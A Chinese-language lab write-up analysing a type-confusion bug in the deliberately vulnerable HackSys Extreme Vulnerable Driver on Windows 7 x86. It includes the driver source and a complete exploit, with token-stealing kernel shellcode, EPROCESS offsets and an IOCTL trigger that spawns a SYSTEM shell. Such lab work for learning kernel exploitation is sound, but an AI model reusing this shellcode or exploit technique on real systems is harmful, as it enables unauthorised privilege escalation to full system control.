## **前言**

窥探Ring0漏洞世界：类型混淆

### 实验环境：

•虚拟机：Windows 7 x86

•物理机：Windows 10 x64

•软件：IDA，Windbg，VS2022

##  **漏洞分析**

老样子，先IDA分析漏洞函数TriggerTypeConfusion，然后再看看源码

首先是申请了8字节非分页池内存

![](https://image.3001.net/images/20220805/1659686544_62ecce908468705825d51.png!small)

然后接下来，把用户传入的8字节结构保存到了内核申请的8字节空间里，然后调用了一个初始化函数，程序就结束了

![](https://image.3001.net/images/20220805/1659686545_62ecce914de21feb4db58.png!small)

现在来看看这个初始化程序，打印后4字节的内容，然后调用后4字节的内容（回调函数）：![](https://image.3001.net/images/20220805/1659686546_62ecce925e7dc98085326.png!small)

从反汇编的层面看到的是，这里传入的后4字节会被当成函数调用

接下来看看源码：

////// Trigger the Type Confusion Vulnerability  
//////The pointer to USER_TYPE_CONFUSION_OBJECT object  
/// NTSTATUS  
NTSTATUS  
TriggerTypeConfusion(  
_In_ PUSER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject  
)  
{  
NTSTATUS Status = STATUS_UNSUCCESSFUL;  
PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject = NULL;  
PAGED_CODE();  
__try  
{  
//  
// Verify if the buffer resides in user mode  
//  
ProbeForRead(  
UserTypeConfusionObject,  
sizeof(USER_TYPE_CONFUSION_OBJECT),  
(ULONG)__alignof(UCHAR)  
);  
//  
// Allocate Pool chunk  
//  
KernelTypeConfusionObject =
(PKERNEL_TYPE_CONFUSION_OBJECT)ExAllocatePoolWithTag(  
NonPagedPool,  
sizeof(KERNEL_TYPE_CONFUSION_OBJECT),  
(ULONG)POOL_TAG  
);  
if (!KernelTypeConfusionObject)  
{  
//  
// Unable to allocate Pool chunk  
//  
DbgPrint("[-] Unable to allocate Pool chunk\n");  
Status = STATUS_NO_MEMORY;  
return Status;  
}  
else  
{  
DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));  
DbgPrint("[+] Pool Type: %s\n", STRINGIFY(NonPagedPool));  
DbgPrint("[+] Pool Size: 0x%zX\n", sizeof(KERNEL_TYPE_CONFUSION_OBJECT));  
DbgPrint("[+] Pool Chunk: 0x%p\n", KernelTypeConfusionObject);  
}  
DbgPrint("[+] UserTypeConfusionObject: 0x%p\n", UserTypeConfusionObject);  
DbgPrint("[+] KernelTypeConfusionObject: 0x%p\n", KernelTypeConfusionObject);  
DbgPrint("[+] KernelTypeConfusionObject Size: 0x%zX\n",
sizeof(KERNEL_TYPE_CONFUSION_OBJECT));  
KernelTypeConfusionObject->ObjectID = UserTypeConfusionObject->ObjectID;  
KernelTypeConfusionObject->ObjectType = UserTypeConfusionObject->ObjectType;  
DbgPrint("[+] KernelTypeConfusionObject->ObjectID: 0x%p\n",
KernelTypeConfusionObject->ObjectID);  
DbgPrint("[+] KernelTypeConfusionObject->ObjectType: 0x%p\n",
KernelTypeConfusionObject->ObjectType);  
#ifdef SECURE  
//  
// Secure Note: This is secure because the developer is properly setting
'Callback'  
// member of the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the
pointer  
// of 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()'
function as  
// parameter  
//  
KernelTypeConfusionObject->Callback = &ampTypeConfusionObjectCallback  
Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);  
#else  
DbgPrint("[+] Triggering Type Confusion\n");  
//  
// Vulnerability Note: This is a vanilla Type Confusion vulnerability due to
improper  
// use of the 'UNION' construct. The developer has not set the 'Callback'
member of  
// the 'KERNEL_TYPE_CONFUSION_OBJECT' structure before passing the pointer of  
// 'KernelTypeConfusionObject' to 'TypeConfusionObjectInitializer()' function
as  
// parameter  
//  
Status = TypeConfusionObjectInitializer(KernelTypeConfusionObject);  
#endif  
DbgPrint("[+] Freeing KernelTypeConfusionObject Object\n");  
DbgPrint("[+] Pool Tag: %s\n", STRINGIFY(POOL_TAG));  
DbgPrint("[+] Pool Chunk: 0x%p\n", KernelTypeConfusionObject);  
//  
// Free the allocated Pool chunk  
//  
ExFreePoolWithTag((PVOID)KernelTypeConfusionObject, (ULONG)POOL_TAG);  
KernelTypeConfusionObject = NULL;  
}  
__except (EXCEPTION_EXECUTE_HANDLER)  
{  
Status = GetExceptionCode();  
DbgPrint("[-] Exception Code: 0x%X\n", Status);  
}  
return Status;  
}

这里安全版本和非安全版本的区别在于是否初始化回调函数，然后再进入初始化函数

这里用的对象结构如下，可以看到，用户传入的是4字节的Type，而在内核结构里，后4字节是个联合体

typedef struct _USER_TYPE_CONFUSION_OBJECT  
{  
ULONG_PTR ObjectID;  
ULONG_PTR ObjectType;  
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;  
typedef struct _KERNEL_TYPE_CONFUSION_OBJECT  
{  
ULONG_PTR ObjectID;  
union  
{  
ULONG_PTR ObjectType;  
FunctionPointer Callback;  
};  
} KERNEL_TYPE_CONFUSION_OBJECT, *PKERNEL_TYPE_CONFUSION_OBJECT;

最后进入初始化函数，就直接调用回调函数了：

///

/// Type Confusion Object Initializer  
///

///The pointer to KERNEL_TYPE_CONFUSION_OBJECT object  
/// NTSTATUS  
NTSTATUS  
TypeConfusionObjectInitializer(  
_In_ PKERNEL_TYPE_CONFUSION_OBJECT KernelTypeConfusionObject  
)  
{  
NTSTATUS Status = STATUS_SUCCESS;  
PAGED_CODE();  
DbgPrint("[+] KernelTypeConfusionObject->Callback: 0x%p\n",
KernelTypeConfusionObject->Callback);  
DbgPrint("[+] Calling Callback\n");  
KernelTypeConfusionObject->Callback();  
DbgPrint("[+] Kernel Type Confusion Object Initialized\n");  
return Status;  
}

这里初始化函数没啥问题，主要在于进入初始化函数之前，对对象结构的操作，因为使用了联合体，如果没有初始化Callback，那么用户输入的ObjectType会被当成Callback去执行，这就是所谓的类型混淆。

 **漏洞利用**

利用思路就很简单了，传入对象后四字节给定shellcode地址即可：

#include  
#include  
// Windows 7 SP1 x86 Offsets  
#define KTHREAD_OFFSET 0x124 // nt!_KPCR.PcrbData.CurrentThread  
#define EPROCESS_OFFSET 0x050 // nt!_KTHREAD.ApcState.Process  
#define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId  
#define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink  
#define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token  
#define SYSTEM_PID 0x004 // SYSTEM Process PID  
typedef struct _UserObject {  
ULONG_PTR ObjectID;  
ULONG_PTR ObjectType;  
}UserObject,*PUserObject;  
VOID TokenStealingPayloadWin7() {  
// Importance of Kernel Recovery  
__asm {  
pushad  
获取当前进程EPROCESS  
xor eax, eax  
mov eax, fs: [eax + KTHREAD_OFFSET]  
mov eax, [eax + EPROCESS_OFFSET]  
mov ecx, eax  
搜索system进程EPROCESS  
mov edx, SYSTEM_PID  
SearchSystemPID :  
mov eax, [eax + FLINK_OFFSET]  
sub eax, FLINK_OFFSET  
cmp[eax + PID_OFFSET], edx  
jne SearchSystemPID  
token窃取  
mov edx, [eax + TOKEN_OFFSET]  
mov[ecx + TOKEN_OFFSET], edx  
环境还原\+ 返回  
popad  
}  
}  
int main()  
{  
ULONG UserBufferSize = sizeof(UserObject);  
PVOID EopPayload = &ampTokenStealingPayloadWin7  
HANDLE hDevice = ::CreateFileW(L"\\\\\\\\.\\\HacksysExtremeVulnerableDriver",
GENERIC_ALL, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);  
PUserObject UserBuffer = (PUserObject)HeapAlloc(GetProcessHeap(),
HEAP_ZERO_MEMORY, UserBufferSize);  
// 构造对象  
UserBuffer->ObjectID = 0x12345678;  
UserBuffer->ObjectType = (ULONG_PTR)EopPayload;  
ULONG WriteRet = 0;  
DeviceIoControl(hDevice, 0x222023, (LPVOID)UserBuffer, UserBufferSize, NULL,
0, &WriteRet, NULL);  
HeapFree(GetProcessHeap(), 0, (LPVOID)UserBuffer);  
UserBuffer = NULL;  
system("pause");  
system("cmd.exe");  
return 0;  
}

## 截图演示

![](https://image.3001.net/images/20220805/1659686547_62ecce9335ef694f9d5bf.png!small)

 **挖坑**

CVE-2018-8174

 **参考资料**

•[1] hacksysteam/HackSysExtremeVulnerableDriver: HackSys Extreme Vulnerable
Windows Driver
(github.com)https://github.com/hacksysteam/HackSysExtremeVulnerableDriver

